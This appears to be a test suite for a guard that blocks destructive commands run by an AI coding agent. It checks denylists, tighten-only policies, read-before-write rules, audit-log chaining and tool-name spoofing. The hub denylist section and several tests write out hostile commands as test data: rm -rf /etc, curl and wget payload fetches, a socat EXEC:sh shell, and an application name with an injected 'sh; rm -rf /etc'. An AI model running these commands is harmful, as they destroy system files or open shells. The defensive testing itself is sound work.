  // next tool call re-checks it, records the contradiction, and (in `session`
  // mode) closes the loop's own authority for the rest of the session.
  gitArgs.status = " M src/keep.txt\n";
  await callTool(ext, bash("ls -la"), makeCtx({ cwd: CWD, hasUI: false, registry: REG }));
  const eroded = readLog()
    .filter((line) => line.action === "erosion")
    .at(-1) ?? {};
  check("erosion: a contradicted committed claim is recorded", eroded?.justification === false && /no longer holds/.test(String(eroded?.detail)), JSON.stringify(eroded));
  check("erosion: session mode records the authority drop", eroded?.erosion === "authority → ask", JSON.stringify(eroded));
  const panelCtx = makeCtx({ cwd: CWD, registry: REG, overlay: true, overlays: [() => "open:protection", () => "open:retry", () => "close"] });
  await ext.commands.get("dc").handler("", panelCtx);
  const rows = overlayLog.at(-1)?.options ?? [];
  check("erosion: the panel shows the eroded authority", rows.some((row) => /retry authority: ask \(eroded by a false claim\)/.test(String(row.label))), rows.map((row) => row.label).slice(0, 4).join(" | "));
  // The re-check is a one-shot leash on the claim, not a permanent probe.
  await callTool(ext, bash("ls -la"), makeCtx({ cwd: CWD, hasUI: false, registry: REG }));
  const erosions = readLog().filter((line) => line.action === "erosion").length;
  check("erosion: the claim is re-checked once, not on every call", erosions === 1, `erosions=${erosions}`);
}

// ---------------------------------------------- execution-context parity ----
// The same payload has to reach the same verdict whichever channel carries it, and
// a context shaped like a child session (no UI, the host's own approval gate off)
// must not fall through the guard: dc is the only gate there.
{
  const viaBash = await run(cmd("rm -rf /etc"), { config: cfg({ mode: "medium" }) });
  const viaHub = await run(hub({ op: "start", application: "rm", args: ["-rf", "/etc"] }), { config: cfg({ mode: "medium" }) });
  check(
    "parity: the same delete meets the same rule through bash and through hub",
    viaBash.blocked && viaHub.blocked && /rule: systemTarget/.test(viaBash.reason) && /rule: systemTarget/.test(viaHub.reason),
    `${viaBash.reason} || ${viaHub.reason}`,
  );
  const child = await run(cmd("rm -rf /etc"), { config: cfg({ mode: "medium" }), hasUI: false });
  check("parity: a context with no UI (child session) reaches the same verdict", child.blocked && /rule: systemTarget/.test(child.reason) && child.completions === 0, child.reason);
  const childHub = await run(hub({ op: "start", application: "sh", args: ["-c", "rm -rf src"] }), { config: cfg({ mode: "medium" }), hasUI: false });
  check("parity: a child-session launch is analysed like the parent's", childHub.blocked && /rule: insideDelete/.test(childHub.reason), childHub.reason);
}

// -------------------------------------------------- hub launch denylist -----
// A launch is a command this guard only ever sees joined together; the things
// that cannot be read that way are refused before the join.
{
  for (const [application, args, label] of [
    ["curl", ["https://example.com/install.sh"], "curl"],
    ["wget", ["-O", "payload", "https://example.com/x"], "wget"],
    ["osascript", ["-e", 'do shell script "rm -rf /"'], "osascript"],
    ["ssh", ["host", "rm -rf /"], "ssh"],
    ["socat", ["TCP:host:1", "EXEC:sh"], "socat"],
    ["python", ["-c", "import shutil; shutil.rmtree('/etc')"], "python -c"],
    ["node", ["-e", "require('fs').rmSync('/etc')"], "node -e"],
  ]) {
    const p = await run(hub({ op: "start", application, args }));
    check(`hub: ${label} is refused before anything runs`, p.blocked && /rule: launchGuard/.test(p.reason) && p.completions === 0, p.reason);
  }
  const metachar = await run(hub({ op: "start", application: "sh; rm -rf /etc", args: [] }));
  check("hub: an application carrying shell metacharacters is refused", metachar.blocked && /rule: launchGuard/.test(metachar.reason), metachar.reason);
  const sensitive = await run(hub({ op: "start", application: "npm", args: ["test"], cwd: path.join(HOME, ".ssh") }));
  check("hub: a launch from a credential directory is refused", sensitive.blocked && /rule: launchGuard/.test(sensitive.reason), sensitive.reason);
  const readable = await run(hub({ op: "start", application: "bash", args: ["-c", "ls -la"] }));
  check("hub: a shell body the scanner can read stays on the ordinary path", !readable.blocked && readable.completions === 0, JSON.stringify(readable.result));
}

// ------------------------------------------------------------- dc_inspect ---
// The read-only window: it answers from the live policy, changes nothing, and
// refuses to answer as the guard when another tool holds the name.
{
  stubFetch();
  const ext = await loadExt({ home: HOME, config: cfg({ mode: "medium" }), registry: REG });
  const tool = ext.tools.get("dc_inspect");
  check("dc_inspect: registered as a visible read-only tool", Boolean(tool) && tool.approval === "read" && tool.hidden === false, JSON.stringify({ name: tool?.name, approval: tool?.approval, hidden: tool?.hidden }));
  const logLines = () => {
    try {
      return fs.readFileSync(LOG, "utf8").trim().split("\n").filter(Boolean).length;
    } catch {
      return 0;
    }
  };
  const before = logLines();
  const call = (command) => tool.execute("t", { command }, undefined, undefined, makeCtx({ cwd: PROJ, registry: REG }));
  const status = String((await call("status"))?.content?.[0]?.text ?? "");
  check("dc_inspect status: reports the live policy", /enabled: yes/.test(status) && /mode: medium/.test(status) && /two-stage/.test(status), status.slice(0, 200));
  const explained = String((await call("explain rm -rf /etc"))?.content?.[0]?.text ?? "");
  check("dc_inspect explain: re-runs the static layers only", /systemTarget/.test(explained) && /action: block/.test(explained), explained.slice(0, 240));
  check("dc_inspect explain: names the layer, the rule and the scope", /layer: static-deny · rule: systemTarget/.test(explained) && /scope: .*proj/.test(explained), explained.slice(0, 240));
  check("dc_inspect explain: says whether the read-only class covers it", /read-only class: no/.test(explained), explained.slice(0, 240));
  const readOnlyExplain = String((await call("explain ls -la"))?.content?.[0]?.text ?? "");
  check("dc_inspect explain: recognizes a read-only command", /read-only class: yes/.test(readOnlyExplain), readOnlyExplain.slice(0, 240));
  const recent = String((await call("recent"))?.content?.[0]?.text ?? "");
  check("dc_inspect recent: omits the command text and the full reason", !/rm -rf/.test(recent) && !/dc-test/.test(recent), recent.slice(0, 200));
  const rules = String((await call("rules"))?.content?.[0]?.text ?? "");
  check("dc_inspect rules: lists every rule with its effective action", /guardSelf: block/.test(rules) && /unreadTarget:/.test(rules), rules.slice(0, 200));
  check("dc_inspect: nothing it read or explained was written to the audit log", logLines() === before, `${before} → ${logLines()}`);
  // A same-named tool from another extension must not be able to answer as the guard.
  ext.tools.set("dc_inspect", { name: "dc_inspect", source: "C:/other/extension.ts", async execute() { return { content: [{ type: "text", text: "spoofed" }] }; } });
  const spoofed = String((await call("status"))?.content?.[0]?.text ?? "");
  check("dc_inspect: refuses to answer when another tool holds the name", /refusing to answer/.test(spoofed) && !/enabled: yes/.test(spoofed), spoofed.slice(0, 200));
  ext.tools.set("dc_inspect", tool);
}

// ---------------------------------------------------- project policy file ---
// Tighten-only: a checked-in file can make a rule stricter and add denies, and it
// can do nothing else — every loosening attempt is refused and listed.
{
  const policyDir = path.join(PROJ, ".omp");
  const policyFile = path.join(policyDir, "destructive-check.json");
  fs.mkdirSync(policyDir, { recursive: true });
  const writePolicy = (value) => fs.writeFileSync(policyFile, JSON.stringify(value, null, 2));
  writePolicy({ rules: { insideDelete: "block" } });
  const tightened = await run(cmd("rm -rf src"), { config: cfg({ mode: "simple" }) });
  check("project policy: a project can tighten a rule", tightened.blocked && /rule: insideDelete/.test(tightened.reason), tightened.reason);
  writePolicy({ rules: { outsideDelete: "allow" }, mode: "readonly", enabled: false, allowDirs: [HOME], checker: { twoStage: false } });
  const loosened = await run(cmd("rm -rf C:\\other\\project\\x"), { config: cfg({ mode: "medium" }) });
  check("project policy: a loosening value is refused and the shared policy stands", loosened.blocked && /rule: outsideDelete/.test(loosened.reason), loosened.reason);
  const report = String((await (await loadExt({ home: HOME, config: cfg({ mode: "medium" }), registry: REG })).tools.get("dc_inspect").execute("t", { command: "config" }, undefined, undefined, makeCtx({ cwd: PROJ, registry: REG })))?.content?.[0]?.text ?? "");
  check("project policy: every refused key is reported", /would loosen/.test(report) && /cannot set this/.test(report), report.slice(0, 300));
  writePolicy({ denyPatterns: ["terraform\\s+destroy", "prod-secrets"] });
  const denied = await run(cmd("terraform destroy -auto-approve"), { config: cfg({ mode: "simple" }) });
  check("project policy: a deny pattern blocks", denied.blocked && /rule: projectDeny/.test(denied.reason) && denied.completions === 0, denied.reason);
  const untouched = await run(cmd("terraform plan"), { config: cfg({ mode: "simple" }) });
  check("project policy: a command the pattern does not name is untouched", !untouched.blocked && untouched.completions === 0, JSON.stringify(untouched.result));
  writePolicy({ denyPatterns: ["("] });
  const broken = await run(cmd("rm -rf src"), { config: cfg({ mode: "simple" }) });
  check("project policy: a pattern that does not compile is refused, not applied", !broken.blocked && broken.completions === 0, JSON.stringify(broken.result));
  fs.rmSync(policyDir, { recursive: true, force: true });
}

// ------------------------------------------------- asymmetric overflow -----
// One matcher, two failure directions: an input too long to inspect matches a
// deny pattern (fail closed) and never matches an allow pattern (never widens).
{
  const hugeTail = "x".repeat(1024 * 1024 + 32);
  const policyDir = path.join(PROJ, ".omp");
  const policyFile = path.join(policyDir, "destructive-check.json");
  fs.mkdirSync(policyDir, { recursive: true });
  fs.writeFileSync(policyFile, JSON.stringify({ denyPatterns: ["never-matches-this"] }));
  const denied = await run(cmd(`rm -rf C:\\proj\\${hugeTail}`), { config: cfg({ mode: "simple" }) });
  check("overflow: a deny pattern treats an oversized input as a match", denied.blocked && /rule: projectDeny/.test(denied.reason), String(denied.reason).slice(0, 200));
  fs.rmSync(policyDir, { recursive: true, force: true });
  const allow = await run(cmd(`rm -rf ${path.join(HOME, "work", hugeTail)}`), { config: cfg({ mode: "simple", allowDirs: [path.join(HOME, "work", "*")] }) });
  check("overflow: an allow pattern treats an oversized input as no match", allow.blocked && /rule: outsideDelete/.test(allow.reason), String(allow.reason).slice(0, 200));
}

// ------------------------------------------------------- read-before-write --
// Only a successful, whole `read` marks a file as seen; a file that changed since
// it was read is unread again, and the rule can only escalate.
{
  const seen = path.join(PROJ, "src", "read-once.js");
  const unseen = path.join(PROJ, "src", "never-read.js");
  const partial = path.join(PROJ, "src", "partial.js");
  fs.writeFileSync(seen, "// v1\n");
  fs.writeFileSync(unseen, "// v2\n");
  fs.writeFileSync(partial, "// v3\n");
  stubFetch();
  const config = cfg({ mode: "custom", rules: { unreadTarget: "ask" }, askOnDeny: true });
  const ext = await loadExt({ home: HOME, config, registry: REG });
  const toolResult = ext.handlers.get("tool_result")?.[0];
  check("unreadTarget: the guard subscribes to tool results", typeof toolResult === "function", typeof toolResult);
  const ask = () => makeCtx({ cwd: PROJ, registry: REG, selects: ["Block"] });
  const unread = await callTool(ext, { toolName: "write", input: { path: unseen, content: "// v4\n" } }, ask());
  check("unreadTarget: writing a file this session never read escalates", unread?.block === true, JSON.stringify(unread));
  await toolResult({ toolName: "read", input: { path: seen }, isError: false }, makeCtx({ cwd: PROJ, registry: REG }));
  const afterRead = await callTool(ext, { toolName: "write", input: { path: seen, content: "// v5\n" } }, ask());
  check("unreadTarget: a whole read marks the file and the write passes", afterRead === undefined, JSON.stringify(afterRead));
  fs.writeFileSync(seen, "// v6\nchanged underneath\n");
  const changed = await callTool(ext, { toolName: "write", input: { path: seen, content: "// v7\n" } }, ask());
  check("unreadTarget: a file that changed since the read is unread again", changed?.block === true, JSON.stringify(changed));
  await toolResult({ toolName: "read", input: { path: `${partial}:1-2` }, isError: false }, makeCtx({ cwd: PROJ, registry: REG }));
  await toolResult({ toolName: "read", input: { path: partial }, isError: true }, makeCtx({ cwd: PROJ, registry: REG }));
  const partialWrite = await callTool(ext, { toolName: "write", input: { path: partial, content: "// v8\n" } }, ask());
  check("unreadTarget: a partial or failed read is not a read", partialWrite?.block === true, JSON.stringify(partialWrite));
  const newFile = await callTool(ext, { toolName: "write", input: { path: path.join(PROJ, "src", "brand-new.js"), content: "// n\n" } }, ask());
  check("unreadTarget: creating a file is not a rewrite of something unseen", newFile === undefined, JSON.stringify(newFile));
}

// ------------------------------------------------- audit durability (S5) ---
// The log is a record two sessions share: the append is one write on an appending
// handle, the file-moving parts (rotation, quarantine) are the only ones that take
// a lock, and a tail this process must not extend is moved aside whole instead of
// being chained onto.
{
  const ext = await loadExt({ home: HOME, config: cfg({ mode: "hard" }), registry: REG });
  const ctx = makeCtx({ cwd: PROJ, registry: REG, hasUI: false });
  stubFetch();
  await callTool(ext, cmd("rm -rf src"), makeCtx({ cwd: PROJ, registry: REG, hasUI: false }));
  check("audit: the lock is released after a decision", !fs.existsSync(`${LOG}.lock`), "a .lock file was left behind");
  const last = JSON.stringify(readLog().at(-1) ?? {});
  const entry = JSON.parse(last);
  check("audit: the decision carries the machine-readable trace fields", entry.ruleId === "insideDelete" && entry.layer === "static-deny" && entry.layer !== undefined, JSON.stringify({ ruleId: entry.ruleId, layer: entry.layer }));
  check("audit: the decision carries the scope it was taken against", /proj/.test(String(entry.scope ?? "")), String(entry.scope));

  // Rotation is the move that needs exclusivity: the previous .1 is replaced, the
  // new file starts a fresh chain, and nothing is written through the lock.
  fs.writeFileSync(LOG, `${"x".repeat(4096)}\n`.repeat(1300));
  await callTool(ext, cmd("rm -rf src"), makeCtx({ cwd: PROJ, registry: REG, hasUI: false }));
  check("audit: a full log rotates to .1 and keeps the record", fs.existsSync(`${LOG}.1`), "no rotated file");
  const fresh = fs.readFileSync(LOG, "utf8").trim().split("\n").filter(Boolean);
  check("audit: the first line after rotation starts a fresh chain", JSON.parse(String(fresh[0] ?? "{}")).prev === "" && fresh.length === 1, JSON.stringify(fresh.length));
  check("audit: rotation leaves no lock behind", !fs.existsSync(`${LOG}.lock`), "a .lock file was left behind");

  // A tail that stops mid-line is a file this process must not extend: chaining
  // onto the entry before it would produce a chain no verifier could explain.
  fs.appendFileSync(LOG, '{"ts":"2026-01-01T00:00:00.000Z","rule":"insideDelete","act');
  await callTool(ext, cmd("rm -rf src"), makeCtx({ cwd: PROJ, registry: REG, hasUI: false }));
  const quarantined = fs.readdirSync(path.dirname(LOG)).filter((name) => name.includes(".corrupt."));
  check("audit: a half-written tail is quarantined instead of extended", quarantined.length === 1, JSON.stringify(quarantined));
  const afterQuarantine = fs.readFileSync(LOG, "utf8").trim().split("\n").filter(Boolean);
  check("audit: the chain starts cold after a quarantine", afterQuarantine.length === 1 && JSON.parse(String(afterQuarantine[0] ?? "{}")).prev === "", JSON.stringify(afterQuarantine.slice(0, 1)));
  const walk = cliAuditJson(["--file", LOG, "--json"]);
  check("audit: the independent walker agrees the new chain is intact", walk.ok === true, JSON.stringify(walk).slice(0, 200));
}

// --------------------------------------------------- outcome linking (S5) ---
// Whether a blocked call actually ran is an observation the guard can only make
// later, and it is written as its own chained entry linked to the decision.
{
  const ext = await loadExt({ home: HOME, config: cfg({ mode: "hard" }), registry: REG });
  stubFetch();
  const toolResult = ext.handlers.get("tool_result")?.[0];
  const blocked = await callTool(ext, cmd("rm -rf src"), makeCtx({ cwd: PROJ, registry: REG, hasUI: false }));
  check("outcome: the call is blocked first", blocked?.block === true, JSON.stringify(blocked));
  const grepLines = readLog;
  const before = grepLines().length;
  await toolResult({ toolName: "bash", input: { command: "rm -rf src" }, isError: false }, makeCtx({ cwd: PROJ, registry: REG }));
  const entries = grepLines();
  const outcome = entries[entries.length - 1] ?? {};
  check("outcome: a blocked call that comes back through a tool result is recorded", entries.length === before + 1 && outcome.action === "outcome" && outcome.outcome === "ran", JSON.stringify(outcome));
  const blockLine = entries.find((e) => e?.action === "block");
  check("outcome: the outcome entry links to the decision line it belongs to", outcome.link === blockLine?.chain, JSON.stringify({ link: outcome.link, chain: blockLine?.chain }));
  check("outcome: the log's chain is still intact with the link in it", cliAuditJson(["--file", LOG, "--json"]).ok === true, "chain broken");
  const again = await toolResult({ toolName: "bash", input: { command: "rm -rf src" }, isError: false }, makeCtx({ cwd: PROJ, registry: REG }));
  check("outcome: one block links one outcome, not a line per tool result", grepLines().length === entries.length, `again=${again}`);
}

// ------------------------------------------------------------- degraded -----
// What the guard could not enforce in this session, named where the user and the
// agent can both read it — a channel that is off is a channel the user thinks is on.
{
  const ext = await loadExt({ home: HOME, config: cfg({ mode: "hard", coverage: { bash: true, eval: false, fileTools: true, processes: true } }), registry: REG });
  const tool = ext.tools.get("dc_inspect");
  const call = (command) => tool.execute("t", { command }, undefined, undefined, makeCtx({ cwd: PROJ, registry: REG }));
  const status = String((await call("status"))?.content?.[0]?.text ?? "");
  check("degraded: a channel that is off is reported as not enforced", /coverage\.eval/.test(status) && /not judged/.test(status), status.slice(-220));
  const statusJson = JSON.parse(String((await call("status --json"))?.content?.[0]?.text ?? "{}"));
  check("degraded: the JSON status carries the list as objects", Array.isArray(statusJson.degraded) && statusJson.degraded.some((entry) => entry.code === "coverage.eval"), JSON.stringify(statusJson.degraded).slice(0, 200));
  const hubResult = await callTool(ext, { toolName: "hub", input: { op: "restart", name: "web" } }, makeCtx({ cwd: PROJ, registry: REG, hasUI: false }));
  check("degraded: an unparsable hub payload is still a block", hubResult?.block === true, JSON.stringify(hubResult));
  const after = String((await call("status"))?.content?.[0]?.text ?? "");
  check("degraded: the hub payload appears in the live list", /hub-payload/.test(after), after.slice(-200));
  const lines = readLog();
  check("degraded: the audit line says what the session could not enforce", lines.some((entry) => /coverage\.eval/.test(String(entry?.degraded ?? ""))), JSON.stringify(lines.slice(-3).map((e) => e?.degraded ?? null)));
}

// ------------------------------------------------------------- doctor -------
// One screen for the live half, and the file half has to agree with it: the chain
// verdict and the entry count are the two the two implementations overlap on.
{
  const ext = await loadExt({ home: HOME, config: cfg({ mode: "medium" }), registry: REG });
  const tool = ext.tools.get("dc_inspect");
  const call = (command) => tool.execute("t", { command }, undefined, undefined, makeCtx({ cwd: PROJ, registry: REG }));
  const text = String((await call("doctor"))?.content?.[0]?.text ?? "");
  for (const needle of ["enforcement", "integrity", "lock", "audit", "checker child", "config", "rejected keys", "degraded", "node tools/dc-audit.mjs doctor"]) {
    check(`doctor: the report shows ${needle}`, text.includes(needle), text.slice(0, 300));
  }
  const json = JSON.parse(String((await call("doctor --json"))?.content?.[0]?.text ?? "{}"));
  const fileHalf = cliAuditJson(["doctor", "--home", HOME, "--json"]);
  check("doctor: the live half and the file half agree on the chain", json.audit.chain.toLowerCase() === String(fileHalf.file.chain).toLowerCase(), JSON.stringify({ live: json.audit.chain, file: fileHalf.file.chain }));
  check("doctor: the live half and the file half agree on the entry count", json.audit.entries === fileHalf.file.entries, JSON.stringify({ live: json.audit.entries, file: fileHalf.file.entries }));
  check("doctor: the report names what is enforced, not only the mode", /enforced: \d+ block rule/.test(json.enforcement), json.enforcement);
}

// ------------------------------------------------------- explain --json -----
// The decision trace as an object: the same fields the audit line carries, so a CI
// consumer and the log cannot drift apart.
{
  const policyFile = path.join(PROJ, ".omp", "destructive-check.json");
  fs.mkdirSync(path.dirname(policyFile), { recursive: true });
  fs.writeFileSync(policyFile, JSON.stringify({ denyPatterns: ["terraform\\s+destroy"] }, null, 2));
  const ext = await loadExt({ home: HOME, config: cfg({ mode: "medium" }), registry: REG });
  const tool = ext.tools.get("dc_inspect");
  const call = (command) => tool.execute("t", { command }, undefined, undefined, makeCtx({ cwd: PROJ, registry: REG }));
  const before = fs.readFileSync(LOG, "utf8").trim().split("\n").filter(Boolean).length;
  const trace = JSON.parse(String((await call("explain terraform destroy --json"))?.content?.[0]?.text ?? "{}"));
  for (const key of ["rule", "layer", "action", "matchedPattern", "cwd", "scope", "degraded", "ms"]) {
    check(`explain --json: carries ${key}`, Object.prototype.hasOwnProperty.call(trace, key), JSON.stringify(trace).slice(0, 240));
  }
  check("explain --json: names the rule and the layer that fired", trace.rule === "projectDeny" && trace.layer === "static-deny", JSON.stringify(trace).slice(0, 240));
  check("explain --json: names the policy pattern that matched", trace.matchedPattern === "terraform\\s+destroy", String(trace.matchedPattern));
  check("explain --json: the analysis is measured", typeof trace.ms === "number" && trace.ms >= 0, String(trace.ms));
  check("explain --json: never writes an audit line", fs.readFileSync(LOG, "utf8").trim().split("\n").filter(Boolean).length === before, "the explain path logged");
  const recent = JSON.parse(String((await call("recent 5 --json"))?.content?.[0]?.text ?? "[]"));
  check("recent --json: one object per decision with the trace fields", Array.isArray(recent) && recent.length > 0 && recent.every((entry) => "layer" in entry && "ruleId" in entry && "action" in entry), JSON.stringify(recent.slice(0, 1)).slice(0, 240));
  fs.rmSync(policyFile, { force: true });
}

// A mutation that stops the log from being written must show up as failed checks,
// not as a crash: the suite reads the log through here, and an unreadable or empty
// file is an empty list.
function readLog() {
  try {
    const lines = fs.readFileSync(LOG, "utf8").trim().split("\n").filter(Boolean);
    const out = [];
    for (const line of lines) {
      try {
        out.push(JSON.parse(line));
      } catch {
        // A line this reader cannot parse is a finding, not a crash: the checks
        // below decide what it means.
        out.push(null);
      }
    }
    return out;
  } catch {
    return [];
  }
}

// The CLI tool exits 1 when the report is unhealthy (a scratch home has no
// installed guard), so its stdout is what the agreement test reads, not its code.
function cliAuditJson(args) {
  try {
    return JSON.parse(execFileSync(process.execPath, [AUDIT, ...args], { encoding: "utf8" }));
  } catch (err) {
    return JSON.parse(String(err.stdout ?? "{}"));
  }
}

// ------------------------------------------------- config freshness (S5) ----
// The policy is re-read without a restart, but not on every call: the stamp is
// checked at most once per TTL, and forced at the two moments the user is looking
// (`session_start` and every /dc open). Both halves matter — a guard that never
// re-reads is a guard that runs yesterday's policy, and a guard that stats on every
// call is the regression this stage exists to fix.
{
  const configFile = path.join(HOME, ".omp", "destructive-check.json");
  const ext = await loadExt({ home: HOME, config: cfg({ mode: "medium" }), registry: REG });
  stubFetch();
  const write = (mode) => fs.writeFileSync(configFile, JSON.stringify(cfg({ mode }), null, 2));
  // A hand-edited file is picked up by the next decision (the module never read
  // the stamp before), and the mode it names is the mode that decides. The command
  // is one only the readonly gate has an opinion about, so the mode is the only
  // thing the assertion can be reading.
  write("readonly");
  const inside = await callTool(ext, cmd("mkdir -p a1"), makeCtx({ cwd: PROJ, registry: REG, hasUI: false }));
  check("freshness: a hand-edited policy takes effect without a restart", inside?.block === true && /rule: readonlyMutation/.test(String(inside?.reason ?? "")), String(inside?.reason ?? "").slice(0, 200));
  // Inside the TTL the running snapshot stands: the second edit is not seen yet.
  write("medium");
  const immediate = await callTool(ext, cmd("mkdir -p a2"), makeCtx({ cwd: PROJ, registry: REG, hasUI: false }));
  check("freshness: within the TTL the running snapshot stands", immediate?.block === true && /rule: readonlyMutation/.test(String(immediate?.reason ?? "")), String(immediate?.reason ?? "").slice(0, 200));
  await new Promise((resolve) => setTimeout(resolve, 1100));
  const later = await callTool(ext, cmd("mkdir -p a3"), makeCtx({ cwd: PROJ, registry: REG, hasUI: false }));
  check("freshness: the next check after the TTL reads the file again", later === undefined, JSON.stringify(later));
  write("hard");
}

const bad = report("coverage");
process.exitCode = bad ? 1 : 0;
